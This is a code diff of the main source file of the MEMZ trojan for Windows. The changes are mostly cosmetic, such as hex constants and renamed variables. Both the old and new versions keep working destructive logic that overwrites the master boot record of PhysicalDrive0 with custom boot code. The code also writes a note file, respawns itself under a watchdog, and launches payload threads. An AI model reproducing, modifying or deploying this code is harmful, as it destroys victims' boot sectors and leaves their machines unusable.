@@ -1,11 +1,11 @@
 #include "MEMZ.h"
 
 int argc, scrw, scrh;
-int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-	LPWSTR *argv = CommandLineToArgvW(GetCommandLine(), &argc);
+INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
 	scrw = GetSystemMetrics(SM_CXSCREEN);
 	scrh = GetSystemMetrics(SM_CYSCREEN);
-	if (!lstrcmp(argv[1], L"/i")) {
+	LPWSTR *argv = CommandLineToArgvW(GetCommandLine(), &argc);
+	if (!lstrcmp(argv[0x1], L"/i")) {
 		CreateThread(NULL, NULL, &WatchDogThread, NULL, NULL, NULL);
 
 		WNDCLASSEX Wnd;
@@ -22,7 +22,7 @@ int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdL
 		Wnd.lpszMenuName = 0;
 		Wnd.hIconSm = 0;
 		RegisterClassEx(&Wnd);
-		HWND hWnd = CreateWindowEx(0, L"WatchDog", NULL, NULL, 0, 0, 100, 100, NULL, NULL, NULL, NULL);
+		HWND hWnd = CreateWindowEx(0, L"WatchDog", NULL, NULL, 0, 0, 0x64, 0x64, NULL, NULL, NULL, NULL);
 
 		MSG msg;
 		while (GetMessage(&msg, NULL, 0, 0) > 0) {
@@ -30,32 +30,34 @@ int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdL
 			DispatchMessage(&msg);
 		}
 	}
+
 	DWORD wb;
 #ifdef DESTRUCTIVE
 	HANDLE MBR = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
 
-	unsigned char *BootCode = (unsigned char *)LocalAlloc(LMEM_ZEROINIT, 65536);
+	unsigned char *BootCode = (unsigned char *)LocalAlloc(LMEM_ZEROINIT, 0x10000);
 
-	for (int i = 0; i < Code1Len; i++)
+	for (int i = 0; i < nCode1; i++)
 		*(BootCode + i) = *(Code1 + i);
-	for (int i = 0; i < Code2Len; i++)
+	for (int i = 0; i < nCode2; i++)
 		*(BootCode + i + 0x1fe) = *(Code2 + i);
 
-	if (!WriteFile(MBR, BootCode, 65536, &wb, NULL))
+	if (!WriteFile(MBR, BootCode, 0x10000, &wb, NULL))
 		ExitProcess(EXIT_FAILURE);
 
 	CloseHandle(MBR);
 #endif
+
 	HANDLE Info = CreateFile(L"Note.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
-	if (!WriteFile(Info, Note, NoteLen, &wb, NULL))
+	if (!WriteFile(Info, Note, nNote, &wb, NULL))
 		ExitProcess(EXIT_FAILURE);
 
 	CloseHandle(Info);
 
-	wchar_t *mfn = (wchar_t *)LocalAlloc(LMEM_ZEROINIT, 512);
-	GetModuleFileName(NULL, mfn, 512);
-	for (int i = 0; i < 2; i++)
+	wchar_t *mfn = (wchar_t *)LocalAlloc(LMEM_ZEROINIT, 0x200);
+	GetModuleFileName(NULL, mfn, 0x200);
+	for (int i = 0; i < 0x2; i++)
 		ShellExecute(NULL, NULL, mfn, L"/i", NULL, SW_SHOWDEFAULT);
 
 	ShellExecute(NULL, NULL, L"notepad", L"Note.txt", NULL, SW_SHOWDEFAULT);
@@ -65,5 +67,8 @@ int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdL
 		CreateThread(NULL, NULL, &PayloadThread, &Payloads[p], NULL, NULL);
 	}
 
-	Sleep(0x7ffff);
+	LocalFree(mfn);
+
+	Sleep(120000);
+	return EXIT_SUCCESS;
 }
